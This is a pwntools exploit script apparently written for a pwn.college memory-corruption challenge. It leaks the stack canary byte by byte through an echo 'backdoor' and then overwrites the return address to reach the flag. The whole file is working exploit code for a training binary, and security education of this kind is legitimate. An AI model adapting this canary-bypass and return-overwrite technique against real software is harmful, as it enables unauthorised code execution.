#!/bin/python

from pwn import * 
import sys

context.log_level = 'warn'

BACKDOOR=b'REPEAT'
BUFFER_SIZE=0x168
RET_ADDR=0x1834

proc = None

def get_stack_print(stack_idx: int):
    global proc
    proc = process(sys.argv[1])

    payload = cyclic(stack_idx - len(BACKDOOR)) + BACKDOOR
    proc.sendline(str(len(payload)).encode())
    proc.send(payload)

    try:
        proc.recvuntil(b"You said: ")
        proc.recv(len(payload))
    except EOFError as _:
        pass
        #proc.interactive()
        #exit(1)

    return proc


def get_stack_byte():
    byte = proc.recv(1)
    if byte != b'\n':
        print("Byte: " + str(byte))
    return byte if byte != b'\n' else b'\x00'


if len(sys.argv) <= 1: 
    print('Usage: ./mem_corruption.py [PROG]')
#    proc = gdb.debug(sys.argv[1], gdbscript="b challenge")

for _ in range(40):
    canary = b''
    for stack_idx in range(8, BUFFER_SIZE, 8):
        get_stack_print(stack_idx)      
        
        canary = get_stack_byte()
        if canary != b'\x00':
            print("skiping")
            continue

        get_stack_print(stack_idx + 1)

        for i in range(1,8):
            canary += get_stack_byte()
            if canary[i] == 0:
                stack_idx = 8 
                break
        
        if canary != p64(0) and len(canary) == 8:
            break

        proc.close()

    if len(canary) != 8:
        print("No canarie")
        exit(0)

    print(f"Canary: " + str(canary))


    payload = cyclic(BUFFER_SIZE) + canary + \
              cyclic(8) + p16(RET_ADDR)
    proc.sendline(str(len(payload)).encode())
    proc.send(payload)
    
    try:
        if proc.recvuntil("pwn.college", timeout=1) != '':
            print(proc.recvline())
            exit(0)
    except EOFError as _:
        pass
